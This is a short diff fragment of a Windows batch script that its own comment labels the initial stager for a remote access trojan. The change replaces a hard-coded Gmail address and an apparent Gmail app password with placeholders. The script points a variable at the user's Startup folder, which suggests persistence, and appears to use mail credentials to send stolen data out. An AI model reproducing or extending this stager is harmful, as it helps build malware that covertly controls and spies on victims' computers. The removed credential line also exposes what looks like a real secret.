@@ -2,8 +2,8 @@
 
 @rem initial stager for the rat
 
-set MLrZWNKzXe="defalttests@gmail.com"
-set JKgSYUywNCvkasmW="nkos qxgo yxvo brmr"
+set MLrZWNKzXe="examplemail@gmail.com"
+set JKgSYUywNCvkasmW="your app password"
 set CLXduxKZAneOtWBob=%cd%
 set hOEiKdgQksaVGwf=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
 
